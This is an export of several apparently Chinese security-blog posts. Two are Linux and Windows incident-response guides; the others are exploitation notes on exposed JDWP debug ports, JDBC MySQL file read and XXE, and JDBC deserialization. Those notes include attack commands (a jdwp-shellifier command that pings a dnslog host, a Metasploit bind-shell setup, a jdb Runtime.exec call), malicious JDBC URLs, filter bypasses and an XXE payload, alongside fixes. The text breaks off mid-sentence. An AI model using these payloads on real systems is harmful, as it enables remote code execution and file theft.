[{"title":"Linux应急","url":"/2025/07/18/Linux%E5%BA%94%E6%80%A5/","content":"netstat\n用法:  netstat [-vWeenNcCF] [&lt;地址族&gt;] -r         显示路由表  netstat [-vWnNcaeol] [&lt;套接字&gt; ...]        显示套接字连接  netstat &#123; [-vWeenNac] -i | [-cnNe] -M | -s [-6tuw] &#125;  显示接口/伪装连接/统计信息主要选项:  -r, --route              显示路由表  -i, --interfaces         显示网络接口表  -g, --groups             显示多播组 membership 信息  -s, --statistics         显示网络统计信息（类似 SNMP）  -M, --masquerade         显示伪装连接（NAT）显示控制选项:  -v, --verbose            显示详细信息  -W, --wide               不截断 IP 地址显示  -n, --numeric            不解析名称（直接显示数字）  --numeric-hosts          不解析主机名  --numeric-ports          不解析端口名  --numeric-users          不解析用户名  -N, --symbolic           解析硬件名称  -e, --extend             显示扩展信息  -p, --programs           显示套接字对应的 PID/程序名  -o, --timers             显示计时器信息  -c, --continuous         持续刷新显示筛选选项:  -l, --listening          仅显示监听状态的套接字  -a, --all                显示所有套接字（默认：仅显示已连接）  -F, --fib                显示转发信息库（默认）  -C, --cache              显示路由缓存而非 FIB  -Z, --context            显示套接字的 SELinux 安全上下文协议类型:  &lt;套接字类型&gt;=&#123;-t|--tcp&#125; &#123;-u|--udp&#125; &#123;-U|--udplite&#125; &#123;-S|--sctp&#125;                 &#123;-w|--raw&#125; &#123;-x|--unix&#125; --ax25 --ipx --netrom地址族:  &lt;地址族&gt; 使用 &#x27;-6|-4&#x27; 或 &#x27;-A &lt;地址族&gt;&#x27; 或 &#x27;--&lt;地址族&gt;&#x27;；默认：inet  支持的地址族（路由相关）:    inet  (IPv4)        inet6 (IPv6)        ax25 (AMPR AX.25)    netrom (AMPR NET/ROM) rose (AMPR ROSE)  ipx (Novell IPX)    ddp (AppleTalk DDP)  x25 (CCITT X.25)\n\n0x01 入侵排查思路一、账号安全基本使用：1、用户信息文件 &#x2F;etc&#x2F;passwd\nroot:x\\:0:0:root:/root:/bin/bashaccount:password:UID:GID:GECOS:directory:shell\n\n用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后shell\n注意：无密码只允许本机登陆，远程不允许登陆\n2、影子文件 &#x2F;etc&#x2F;shadow\nroot:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7::: //用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留\n\n3、几个常用命令：\nwho      //查看当前登录用户（tty 本地登陆 pts 远程登录）w        //查看系统信息，想知道某一时刻用户的行为uptime   //查看登陆多久、多少用户，负载\n\n入侵排查：1、查询特权用户(特权用户uid 为 0)\n查看/etc/passwd中UID为0的账户。\n2、查询可以远程登录的帐号信息\n无密码不能远程登陆。打开/etc/shadow中查看有加密密码的用户进行判断。(配合who、uptime进行判断哪些正在被远程)\n3、禁用或删除多余及可疑的帐号\nusermod -L user   //禁用帐号，帐号无法登录，/etc/shadow 第二栏为 ! 开头userdel user      //删除 user 用户userdel -r user   //将删除user用户，并且将/home目录下的user目录一并删除\n\n二、历史命令基本使用：\n通过 .bash_history 查看帐号执行过的系统命令\n\n1、root 的历史命令\nhistory\n\n2、历史操作命令的清除：\nhistory -c\n\nps:但此命令并不会清除保存在文件中的记录，因此需要手动删除 /用户名/.bash_profile 文件中的记录。\n入侵排查：进入用户目录下:\ncat .bash_history &gt;&gt; history.txt  //在用户根目录下导出history.txt\n\n三、端口使用 netstat 网络连接命令，分析可疑端口、IP、PID\nnetstat -antlp | more\n\nps:在linux上没有netstat命令时，使用yum install net-tools安装。\n运行 ls -l &#x2F;proc&#x2F;$PID&#x2F;exe 或 file &#x2F;proc&#x2F;$PID&#x2F;exe（$PID 为对应的 pid 号）\n四、进程使用 ps 命令，分析进程\nps aux | grep pid     //输入想查看的pid数字\n\nps：也可以使用top查看高使用率的进程进行分析。\n五、开机启动项基本使用：系统运行级别示意图：\n\n查看运行级别命令\nrunlevel\n\n系统默认允许级别\nvi /etc/inittab id=3：initdefault   //系统开机后直接进入哪个运行级别\n\n开机启动配置文件\n/etc/rc.local /etc/rc.d/rc[0~6].d\n\n例子:当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在 &#x2F;etc&#x2F;init.d 目录下，然后在 &#x2F;etc&#x2F;rc.d&#x2F;rc*.d 中建立软链接即可\n[root@localhost ~]# ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh\n\n此处 sshd 是具体服务的脚本文件，S100ssh 是其软链接，S 开头代表加载时自启动；如果是 K 开头的脚本文件，代表运行级别加载时需要关闭的。\n入侵排查：启动项文件：\nmore /etc/rc.local /etc/rc.d/rc[0~6].d ls -l /etc/rc.d/rc3.d/\n\n查看是否存在脚本的软链接。\n六、定时任务基本使用：1、利用 crontab 创建计划任务\ncrontab -l 列出某个用户 cron 服务的详细内容\n\nTips：默认编写的 crontab 文件会保存在 ( &#x2F;var&#x2F;spool&#x2F;cron&#x2F;用户名 例如: &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root）\n\ncrontab -r 删除每个用户 cront 任务(谨慎：删除所有的计划任务)\ncrontab -e 使用编辑器编辑当前的 crontab 文件\n如：*&#x2F;1 * * * * echo “hello world” &gt;&gt; &#x2F;tmp&#x2F;test.txt 每分钟写入文件\n格式如下\n*    *    *    *    *-    -    -    -    -|    |    |    |    ||    |    |    |    +----- 星期中星期几 (0 - 7) (星期天 为0)|    |    |    +---------- 月份 (1 - 12) |    |    +--------------- 一个月中的第几天 (1 - 31)|    +-------------------- 小时 (0 - 23)+------------------------- 分钟 (0 - 59)\n\n2、利用 anacron 实现异步定时任务调度\n每天运行 &#x2F;home&#x2F;backup.sh 脚本：\nvi /etc/anacrontab @daily 10 example.daily /bin/bash /home/backup.sh\n\n当机器在 backup.sh 期望被运行时是关机的，anacron 会在机器开机十分钟之后运行它，而不用再等待 7 天。\n解释：anacron 如何在 Linux 工作？\nanacron 任务被列在 /etc/anacrontab 中，任务可以使用下面的格式(anacron 文件中的注释必须以 # 号开始)安排。\nanacron 用于以天为单位的频率运行命令。它的工作与 cron 稍有不同，它假设机器不会一直开机。\nanacron 会检查任务是否已经在 period(某一时间) 字段指定的时间被执行了。如果没有，则在等待 delay(延迟) 字段中指定的分钟数后，执行 command 字段中指定的命令。 一旦任务被执行了，它会使用 job-id(时间戳文件名)字段中指定的名称将日期记录在 &#x2F;var&#x2F;spool&#x2F;anacron 目录中的时间戳文件中。\n入侵排查：重点关注以下目录中是否存在恶意脚本\n/var/spool/cron/* /etc/crontab /etc/cron.d/* /etc/cron.daily/* /etc/cron.hourly/* /etc/cron.monthly/* /etc/cron.weekly/ /etc/anacrontab /var/spool/anacron/*\n\n小技巧：\nmore + 路径目录    //查看目录下所有文件\n\n七、服务服务自启动：第一种修改方法：\nchkconfig [--level 运行级别][独立服务名][on|off]chkconfig –level 2345 httpd on 开启自启动chkconfig httpd on （默认 level 是 2345）\n\n第二种修改方法：\n修改 /etc/re.d/rc.local 文件 加入 /etc/init.d/httpd start\n\n第三种修改方法：\n使用 ntsysv 命令管理自启动，可以管理独立服务和 xinetd 服务。\nps:如果没有ntsysv命令使用yum install ntsysv安装。\n入侵排查：1、查询已安装的服务：\nRPM 包安装的服务:\nchkconfig --list 查看服务自启动状态，可以看到所有的RPM包安装的服务ps aux | grep &quot;服务名字&quot; 查看当前服务（不加引号）\n\n系统在 3 与 5 级别下的启动项\n中文环境\nchkconfig --list | grep &quot;3:启用|5:启用&quot;\n\n英文环境\nchkconfig --list | grep &quot;3:on|5:on&quot;\n\n源码包安装的服务\n查看服务安装位置 ，一般是在 &#x2F;user&#x2F;local&#x2F;\nservice httpd start\n\n搜索 &#x2F;etc&#x2F;rc.d&#x2F;init.d&#x2F; 查看是否存在\n八、系统日志日志默认存放位置：&#x2F;var&#x2F;log&#x2F;\n查看日志配置情况：more &#x2F;etc&#x2F;rsyslog.conf\n\n主要日志文件介绍：\n内核及公共消息日志:/var/log/messages计划任务日志：/var/log/cron系统引导日志：/var/log/dmesg邮件系统日志:/var/log/maillog用户登录日志：/var/log/lastlog/var/log/boot.log（记录系统在引导过程中发生的时间）/var/log/secure (用户验证相关的安全性事件)/var/log/wtmp(当前登录用户详细信息)/var/log/btmp（记录失败的的记录）/var/run/utmp（用户登录、注销及系统开、关等事件）\n\n日志文件详细介绍：\n1、\n/var/log/secure        //Linux系统安全日志，记录用户和工作组的情况、用户登陆认证情况\n\n\n可以看到这里有ssh的连接日志。\n2、\n/var/log/boot.log      //该文件记录了系统在引导过程中发生的事件\n\n\n说实话，这个用处并不是很大。\n3、\n/var/log/messages//内核及公共信息日志，是许多进程日志文件的汇总，从该文件中可以看出任何***或成功的***\n\n\n里面的内容很多，而且很杂，一般情况下我们用不到这个。\n4、\n/var/log/dmesg//系统引导日志\n\n该日志使用dmesg命令快速查看最后一次系统引导的引导日志dmesg | more\n\n5、\n/var/log/lastlog//最近的用户登录事件，一般记录最后一次的登录事件\n\nps:该日志不能用诸如cat、tail等查看，因为该日志里面是二进制文件，可以用lastlog命令查看，它根据UID排序显示登录名、端口号（tty）和上次登录时间。如果一个用户从未登录过，lastlog显示 Never logged。\n\n6、\n/var/log/wtmp//该日志文件永久记录每个用户登录、注销及系统的启动、停机的事件。\n\nps:该日志为二进制文件，不能用诸如tail&#x2F;cat&#x2F;等命令，使用last命令查看。\n\n7、\n/var/log/mailog//记录邮件的收发\n\n\n8、\n/var/log/btmp//此文件是记录错误登录的日志，可以记录有人使用暴力破解ssh服务的日志。\n\nps:该文件用lastb打开\n\n9、\n/var/log/utmp//该日志记录当前用户登录的情况，不会永久保存记录。\n\nps:可以用who&#x2F;w命令来查看\n\n","tags":["应急响应"]},{"title":"windows应急","url":"/2025/07/16/windows%E5%BA%94%E6%80%A5/","content":"相关命令netstat用于 显示网络连接、路由表、接口统计等信息\nnetstat -ano普通用户netstat -abno需要管理员权限\n\nNETSTAT [-a] [-b] [-e] [-f] [-i] [-n] [-o] [-p proto] [-r] [-s] [-t] [-x] [-y] [interval] -a            显示所有连接和侦听端口。 -b            显示创建每个连接所涉及的可执行文件或               侦听端口。在某些情况下，已知的可执行文件托管               多个独立组件，在这些情况下，将显示               创建连接               或侦听端口所涉及的组件序列。在这种情况下，可执行文件               名称位于 [] 底部，顶部是它调用的组件，               依此类推，直到达到 TCP/IP。请注意，此选项               可能很耗时，并且会失败，除非你有足够的               权限。 -n            以数字形式显示地址和端口号。 -o            显示与每个连接关联的拥有进程 ID。\n\ntasklist用于 查看当前运行的所有进程\ntasklist /svc | findstr &#123;PID&#125;\n\n获取关联dll的进程\ntasklist /m *.dll\n\nwmic使用wmic获取进程及其命令(win11 22H2 及以上版本用不了了)\nwmic process get caption,commandline | findstr &quot;svchost.exe&quot;\n\npowershell等效命令\nGet-CimInstance Win32_Process | Where-Object &#123; $_.Name -eq &quot;svchost.exe&quot; &#125; | Select-Object Name, CommandLine\n\n注册表WIN+R - regedit\n一、HKEY_CLASSES_ROOT\nHKEY_CLASSES_ROOT（简称HKCR）是Windows 10注册表中的一个重要根键，它包含了启动应用程序所需的全部信息，是应用程序运行时必需的信息仓库。这个键不仅关联了文件扩展名与应用程序，还包含了COM类注册信息，例如ProgID、CLSID和IID等。\n二、HKEY_CURRENT_USER\n**HKEY_CURRENT_USER**（简称HKCU）是一个重要的根键，它包含了当前登录用户的所有配置信息。这些信息通常包括桌面设置、应用程序设置、网络配置、个人偏好等。当用户登录系统时，这些信息会从**HKEY_USERS**下相应的子键（即用户的SID键）复制到**HKEY_CURRENT_USER**，以提供对当前用户的快速访问。\n三、HKEY_LOCAL_MACHINE\nHKEY_LOCAL_MACHINE（简称HKLM）是Windows 10注册表中的一个核心根键，它保存了与当前计算机硬件配置（包括安装的硬件和软件）以及操作系统和软件的配置信息。这些信息是全局性的，适用于计算机上的所有用户。\n四、HKEY_USERS\nHKEY_USERS是Windows 10注册表中的一个根键，用于管理和存储系统中所有用户的配置信息。这个根键包含了缺省用户设置和登录用户的信息，这些设置决定了系统如何为每个用户呈现外观和行为。\n五、HKEY_CURRENT_CONFIG\nHKEY_CURRENT_CONFIG是Windows 10注册表中的一个根键，它保存了关于当前硬件配置的信息。这个根键在系统启动时确定哪些配置被加载，以及哪些驱动程序和服务被激活。它实际上是一个指向\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\HardwareProfiles\\Current的别名，包含了在启动时由本地计算机系统使用的硬件配置文件的相关信息。这包括加载的设备驱动程序、显示时使用的分辨率等。\nRegistryChangesView注册表对比工具创建快照随便操作一下(创建个用户)\nnet user test 123456 /add\n\n再创建一个快照文件，分别导入两个文件进行比对，或者直接选择与当前注册表比对\n计划任务Win+R taskschd.msc或cmd schtasksOPENARK 工具\n系统账户Win+R lusrmgr.msc\n安全日志系统日志: %SystemRoot%\\System32\\Winevt\\Logs\\System.evtx应用程序日志: %SystemRoot%\\System32\\Winevt\\Logs\\Application.evtx安全日志: %SystemRoot%\\System32\\Winevt\\Logs\\Security.evtx(如C:\\Windows\\System32\\winevt\\Logs\\日志)\n如何打开日志我的电脑右键管理，如下，这里着重看安全日志\n日志字段说明Windows事件日志中记录的信息中，关键的要素包含事件级别、记录时间、事件来源、事件ID、事件描述、涉及的用户、计算机、操作代码及任务类别等。其中事件的ID与操作系统的版本有关，以下列举出的事件ID的操纵系统为Vista&#x2F;Win7&#x2F;Win8&#x2F;Win10&#x2F;Server2008&#x2F;Server 2012及之后的版本：\n\n\n\n事件ID\n说明\n\n\n\n1102\n清理审计日志\n\n\n4624\n账号成功登录\n\n\n4625\n账号登录失败\n\n\n4768\nKerberos身份验证（TGT请求）\n\n\n4769\nKerberos服务票证请求\n\n\n4776\nNTLM身份验证\n\n\n4672\n授予特殊权限\n\n\n4720\n创建用户\n\n\n4726\n删除用户\n\n\n4728\n将成员添加到启用安全的全局组中\n\n\n4729\n将成员从安全的全局组中移除\n\n\n4732\n将成员添加到启用安全的本地组中\n\n\n4733\n将成员从启用安全的本地组中移除\n\n\n4756\n将成员添加到启用安全的通用组中\n\n\n4757\n将成员从启用安全的通用组中移除\n\n\n4719\n系统审计策略修改\n\n\n五种事件类型中，最为重要的是成功审核（Success Audit），所有系统登录成功都会被标记成为成功审核。每个成功登录的事件都会标记一个登录类型：\n\n\n\n登录类型\n说明\n\n\n\n2\n交互式登录（用户从本地键盘上进行登录）\n\n\n3\n网络（例如：通过 net use、访问共享网络）\n\n\n4\n批处理（为批处理程序保留）\n\n\n5\n服务启动（服务登录）\n\n\n6\n不支持\n\n\n7\n解锁（当用户离开计算机，屏保启动锁定计算机，需要输入密码重新进入。失败的类型 7 登录表明有人输入了错误的密码或尝试解锁计算机）\n\n\n8\n网络明文（像类型 3 一样，但密码在网络上以明文传输）\n\n\n10\n远程交互（终端服务、远程桌面、远程辅助）\n\n\n11\n缓存域证书登录（使用缓存的域凭据登录，如笔记本电脑在脱机时登录）\n\n\n分析实例–查找创建账号的日志如下进行筛选\n如下，根据日志，我们可以分析出历史创建账号的一些信息。\n\n筛选账号成功登录的日志\n如下登录类型为2，代表该账号是从本地进行登录\n\n观星平台Windows日志分析工具\n\n\n工具DnslookupView工具对终端进行监控，只要终端发起DNS解析请求即可获取到请求信息https://www.nirsoft.net/utils/dns_lookup_view.html \nSysmon系统监控工具(Sysmon同时具有windows版和linux版)https://docs.microsoft.com/en-us/sysinternals/downloads/sysmonsysmon图形化管理工具https://github.com/nshalabi/SysmonTools\nEvent ID\nEvent ID 1: Process creation 进程创建  Event ID 2: A process changed a file creation time 进程更改了文件创建时间  Event ID 3: Network connection 网络连接  Event ID 4: Sysmon service state changed Sysmon 服务状态已更改  Event ID 5: Process terminated 进程终止  Event ID 6: Driver loaded 已加载驱动程序  Event ID 7: image loaded 文件镜像已加载  Event ID 8: CreateRemoteThread 创建远程线程  Event ID 9: RawAccessRead  Event ID 10: ProcessAccess 进程访问  Event ID 11: FileCreate 文件创建  Event ID 12: RegistryEvent (Object create and delete) 注册表事件  EVENT ID 12: REGISTRYEVENT (OBJECT CREATE AND DELETE)  Event ID 13: RegistryEvent (Value Set) 注册值设置  Event ID 14: RegistryEvent (Key and Value Rename)注册表键值设置  Event ID 15: FileCreateStreamHash 文件创建流哈希  Event ID 16: ServiceConfigurationChange sysmon配置文件更改  Event ID 17: PipeEvent (Pipe Created) 管道创建  Event ID 18: PipeEvent (Pipe Connected)管道连接  Event ID 19: WmiEvent (WmiEventFilter activity detected)  Event ID 21: WmiEvent (WmiEventConsumerToFilter activity detected)  Event ID 22: DNSEvent (DNS query) DNS查询  Event ID 23: FileDelete (File Delete archived) 已归档文件删除  Event ID 24: ClipboardChange (New content in the clipboard) 剪切板的新内容  Event ID 25: ProcessTampering (Process image change) 进程镜像文件修改  Event ID 26: FileDeleteDetected (File Delete logged) 记录文件删除  Event ID 255: Error Sysmon报错\n\n火绒剑火绒剑是一款专为Windows平台设计的安全分析工具，属于ARK（Anti-Rootkit）工具的一种。它能够单独分析某个特定进程，也可以监控系统中所有进程的活动。火绒剑经过微软官方的安全认证，因此在安装后，Windows Defender会自动关闭以避免冲突。\nProcess ExplorerProcess Explorer让使用者能了解看不到的在后台执行的处理程序，能显示目前已经载入哪些模块，分别是正在被哪些程序使用着，还可显示这些程序所调用的DLL进程，以及他们所打开的句柄。Process Explorer最大的特色就是可以中终任何进程，甚至包括系统的关键进程可以查看内存字符串，如果是C2马可以看到外联的IP地址 \nTCPView\n\n本文参考Chen_D师傅的文章\n","tags":["应急响应"]},{"title":"JDWP","url":"/2025/07/31/JDWP/","content":"JDWP（Java Debug Wire Protocol Transport Interface）协议是用于调试器（debugger）和被调试的Java虚拟机（Target VM）之前的通信协议\n启动方式JDK自带java -agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=5050 -jar xxx.jar\nidea选择启动文件中的编辑配置的Run&#x2F;Debug Configuratiions中配置\nmavenmvn spring-boot:run -Drun.jvmArguments=**&quot;-Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=y,address=8001&quot;\ntomcatwindows下bin目录下的startup.bat文件中加入\nSET CATALINA_OPTS=-server -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=8000\n然后cmd运行startup.bat就可以在8000端口上开启JDWP协议了或者直接\n/tomcat/bin/catalina.bat jpda run/tomcat/bin/catalina.bat jpda start\n\nlinux下bin目录下找到 catalina.sh 文件,加入\nCATALINA_OPTS=&quot;-Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=*:8000&quot;\n或者直接\n/tomcat/bin/catalina.sh jpda run/tomcat/bin/catalina.sh jpda start\n\n探测可疑端口:8000 5005 8080探测主要是利用了jdwp握手阶段互发JDWP-Handshake的特性\n1.nmap和fscan很多情况下扫不出来jdwp服务,会显示http-alt\n2.python探测脚本import socket    client = socket.socket()  client.connect((&quot;127.0.0.1&quot;, 8000))  client.send(b&quot;JDWP-Handshake&quot;)    if client.recv(1024) == b&quot;JDWP-Handshake&quot;:      print(&quot;[*]JDWP Service!&quot;)    client.close()\n\n利用1&gt;jdwp-shellifier(此工具需要python2环境)该漏洞无回显，可利用dnslog进行探测\npython2 jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on &quot;java.lang.String.indexof&quot; --cmd &quot;ping xxx.dnslog.cn&quot;\n\n2&gt;msf在msf中可以使用exploit&#x2F;multi&#x2F;misc&#x2F;java_jdwp_debugger模块进行攻击利用。原理是去找sleeping中的线程，然后下发单步指令是程序断下来，从而触发命令执行。\nuse exploit/multi/misc/java_jdwp_debuggerset rhosts x.x.x.xset payload linux/x64/shell/bind_tcp  run\n\n3&gt;JDBjdb是JDK中自带的命令行调试工具。这里是按照msf中的方式：\n\nattach到远程JDWP服务；\nthreads命令查看所有线程，查找sleeping的线程；\nthread sleeping的线程id，然后stepi进入该线程；\n通过print|dump|eval命令，执行Java表达式从而达成命令执行；\n\n命令:\njdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8000\nthreads\nthread &lt;线程id&gt;(如0xc6a)\nstepi\neval java.lang.Runtime.getRuntime().exec(&quot;calc&quot;)\n\n回显利用:为JDWP远程命令执行加上回显\n修复\n关闭JDWP服务，或限制JDWP服务只对指定ip开放；\n关闭Java Debug模式\n\n","tags":["redTeam"]},{"title":"JDBC mysql任意文件读取漏洞","url":"/2025/09/19/JDBC-mysql%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/","content":"读文件当我们可以控制jdbc mysql连接的时候,我们可以通过设置如下这几个参数通过连接恶意mysql服务器来达到任意文件读取的危害\n文件读取的参数allowLoadLocalInfileInPath=/ 设置读的目录为根目录，这样所有的目录文件都可以读取allowLoadLocalInfile=true 允许mysql读取客户端本地文件allowUrlInLocalInfile=true 允许mysql通过url的形式读取客户端本地文件(如果有udf或mysql插件允许使用http_get(url)这样的函数,又会导致ssrf漏洞)设置包大小参数maxAllowedPacket=655360\n\n核心机制:mysql可以要求客户端读取本地文件的,例如执行以下sql\nLOAD DATA LOCAL INFILE &#x27;/path/to/file&#x27;INTO TABLE t;\n\n底层 MySQL 协议流程是：\nServer → Client : 请给我这个文件的内容 Client → Server : 好的，我把文件读出来发给你\n\n客户端是被动执行mysql指令的\n现在我们如果可以控制一个客户端的jdbc连接点,就可以设置指定参数,利用这一特性来做到任意文件读取\n攻击流程:客户端携带危险jdbc参数连接恶意mysql–&gt;客户端进行jdbc连接后的默认sql语句查询–&gt;mysql返回恶意指令,请求读取客户端文件–&gt;客户端jdbc自动将文件发送到mysql\npayload:\njdbc:mysql://127.0.0.1:3306/test?allowLoadLocalInfile=true&amp;allowUrlInLocalInfile=true&amp;allowLoadLocalInfileInPath=/&amp;maxAllowedPacket=65536&amp;user=fileread_file_path\n\nmysql蜜罐应该也是用的这个漏洞\nJDBC连接参数不完全可控的绕过注释符绕过有一些情景开发人员可能意识到了这个问题,采用url拼接已赋值的危险参数的形式来防护\nString jdbcUrl = request.getParameter(&quot;jdbcUrl&quot;);Connection conn = DriverManager.getConnection(jdbcUrl + &quot;&amp;serverTimezone=Asia/Shanghai&amp;allowLoadLocalInfile=false&amp;allowUrlInLocalInfile=false&quot;);\n\n在8.0.x版本可以使用注释符#来注释掉后面的内容,这样就可以注释掉拼接内容\n\n在5.1.x版本不能通过#注释来绕过,但可以通过&amp;x&#x3D;这种形式来绕过,但拼接的内容不能是以&amp;开始\n\n黑名单绕过如果黑名单这样写\npublic static boolean isValidUrl(String url)&#123;  if(url.contains(&quot;allowLoadLocalInfile&quot;)||url.contains(&quot;allowUrlInLocalInfile&quot;)||url.contains(&quot;allowLoadLocalInfileInPath&quot;))&#123;    return false;  &#125;&#125;\n\n那么在8.0.x是可以使用url编码的方式来对参数名和参数值进行编码,但5.1.x仅仅参数值可以被编码,无法绕过这个黑名单\n\n防御使用预先定义的Properties将URL中的属性覆盖掉\nProperties properties = new Properties();properties.setProperty(&quot;allowLoadLocalInfile&quot;,&quot;false&quot;);properties.setProperty(&quot;allowUrlInLocalInfile&quot;,&quot;false&quot;);properties.setProperty(&quot;allowLoadLocalInfileInPath&quot;,&quot;&quot;);Connection conn = DriverManager.getConnection(DB_URL,properties);\n\nJDBC XXE(CVE-2021-2471)这个漏洞是由于MySQL JDBC 8.0.27版本之前，存在getSource()方法未对传入的XML数据做校验，导致攻击者可以在XML数据中引入外部实体，造成XXE攻击\n利用条件比较苛刻,需要找到getSource()参数可控点\n复现jdbc&#x3D;8.0.26\n数据库返回恶意数据导致xxe(一般需要sqli漏洞配合)从数据库查数据之后经过getSource函数处理xml内容\npublic class XXE &#123;        public static void main(String[] args) throws Exception &#123;          String db_ip = &quot;127.0.0.1&quot;;          String db_port = &quot;3306&quot;;          String db_name = &quot;test&quot;;          String db_user = &quot;test&quot;;          String db_pass = &quot;123456&quot;;            String url = &quot;jdbc:mysql://&quot;+db_ip+&quot;:&quot;+db_port+&quot;/&quot;+db_name+&quot;&quot;;          Connection con = DriverManager.getConnection(url,db_user,db_pass);            String sql = &quot;SELECT test FROM test LIMIT 1&quot;;          Statement stmt = con.createStatement();          ResultSet rs = stmt.executeQuery(sql);            String xml = null;          if (rs.next()) &#123;              xml = rs.getString(1);          &#125;          System.out.println(xml);            SQLXML sqlxml = con.createSQLXML();          sqlxml.setString(xml);          sqlxml.getSource(DOMSource.class);      &#125;  &#125;\n\n在数据库中写入恶意xml\n\n成功触发XXE\n\n用户输入恶意数据导致XXEpublic class XXE &#123;    public static void main(String[] args) throws Exception &#123;        String db_ip = &quot;127.0.0.1&quot;;        String db_port = &quot;3306&quot;;        String db_name = &quot;test&quot;;        String db_user = &quot;test&quot;;        String db_pass = &quot;123456&quot;;        String url = &quot;jdbc:mysql://&quot;+db_ip+&quot;:&quot;+db_port+&quot;/&quot;+db_name+&quot;&quot;;        String xxe = &quot;&lt;?xml version=\\&quot;1.0\\&quot; encoding=\\&quot;ISO-8859-1\\&quot;?&gt;\\n&quot; +                &quot;&lt;!DOCTYPE foo [\\n&quot; +                &quot;&lt;!ELEMENT foo ANY &gt;\\n&quot; +                &quot;&lt;!ENTITY xxe SYSTEM \\&quot;http://127.0.0.1:8888/test.dtd\\&quot; &gt;\\n&quot; +                &quot;]&gt;\\n&quot; +                &quot;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&quot;;        Connection con = DriverManager.getConnection(url, db_user, db_pass);        SQLXML sqlxml = con.createSQLXML();        sqlxml.setString(xxe);        sqlxml.getSource(DOMSource.class);    &#125;&#125;\n\n\n","tags":["javaSec"]},{"title":"JDBC反序列化漏洞","url":"/2025/09/19/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","content":"  当可以控制一个网站jdbc连接数据时,如果web应用存在反序列化链,并且jdbc依赖处于危险版本就可以打jdbc反序列化来RCE或读文件\nMysql版本小于8.0.20存在漏洞\n环境mysql jdbc依赖版本8.0.19恶意链CC3.2.1\nServerStatusDiffInterceptor链(最常用)import org.springframework.boot.autoconfigure.SpringBootApplication;  import java.sql.*;    @SpringBootApplication  public class JdbcDesApplication &#123;        public static void main(String[] args) &#123;            String url =                  &quot;jdbc:mysql://127.0.0.1:3306/test?&quot;+                          &quot;autoDeserialize=true&amp;&quot;+                          &quot;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;&quot;+                          &quot;user=deser_CC31_calc&quot;;          try &#123;              DriverManager.getConnection(url);          &#125; catch (SQLException e) &#123;              throw new RuntimeException(e);          &#125;        &#125;  &#125;\n\n从DriverManager.getConnection(url)触发,首先DriverManager要找到一个acceptsURL(url) == true的Driver,相当于判断jdbc连接使用的什么协议,选择对应数据库的Driver,这里进入了MYSQL的驱动\n再由NonRegisteringDriver.connect()将jdbc连接中的参数转化为属性Properties,构建 PropertySet,与mysql数据库建立底层网络连接并返回一个绑定了PropertySet的com.mysql.cj.jdbc.ConnectionImpl对象\n在ConnectionImpl初始化的时候会反射实例化ServerStatusDiffInterceptor并赋值给NoSubInterceptorWrapper.underlyingInterceptor\n可以看到underlyingInterceptor属性为一个ServerStatusDiffInterceptor实例\n\n调用到NativeProtocol.sendQueryPacket()方法时会判断queryInterceptors是否为空,若不为空则调用invokeQueryInterceptorsPre()函数\n\ninvokeQueryInterceptorsPre()函数调用每一个拦截器的preProcess方法,这里调用到了ServerStatusDiffInterceptor.preProcess()\n\n在ServerStatusDiffInterceptor.preProcess中并没有对sql参数(也就是SET autocommit&#x3D;1)进行操作,因为ServerStatusDiffInterceptor拦截器的作用是记录和比较 session 状态，而不是运行 SQL\n\npopulateMapWithSessionStatusValues与数据库连接并执行”SHOW SESSION STATUS”SQL语句,将返回的两个表数据存储到rs中,之后执行ResultSetUtil.resultSetToMap(toPopulate, rs)\n\n*注:正常SHOW SESSION STATUS会返回两个表 Variable_name | Value,我们伪造一个数据库,在查询SHOW SESSION STATUS返回恶意数据,从而进行攻击\nresultSetToMap()调用到了危险函数ResultSet.getObject(),getObject()读取列的值,根据 MySQL 列类型自动映射成对应的 Java 对象\n\ngetObject()会判断数据是否为空,如果为空直接返回null,不为空则继续\n\n之后通过switch语句根据列类型执行不同的逻辑\n\n其中BIT类型和BLOB类型可以触发readObject(),并且条件相同:\nif (field.isBinary() || field.isBlob())//判断字段类型是否是二进制或Blobif (this.connection.getPropertySet().getBooleanProperty(PropertyKey.autoDeserialize).getValue())//判断连接属性 autoDeserialize是否=trueif ((data != null) &amp;&amp; (data.length &gt;= 2))if ((data[0] == -84) &amp;&amp; (data[1] == -19))//判断前两个字节是否是0xAC ED（-84, -19 对应 Java 序列化魔数）\n\n\n修复在8.0.20版本中在ServerStatusDiffInterceptor的populateMapWithSessionStatusValues()方法没有调用ResultSetUtil.resultSetToMap()-&gt;ResultSet.getObject()去反序列化特定类型的数据,而是直接使用getString()将返回数据直接转换成字符串\n8.0.19\nServerStatusDiffInterceptor.populateMapWithSessionStatusValues()\n\nResultSet.getObject()\n\n8.0.20\nServerStatusDiffInterceptor.populateMapWithSessionStatusValues()\n\nResultSetImpl.getString()\n\ndetectCustomCollatons链detectCustomCollatons作用是在连接初始化或者查询时检测是否存在自定义字符集排序规则（collation）,执行的SQL语句是SHOW 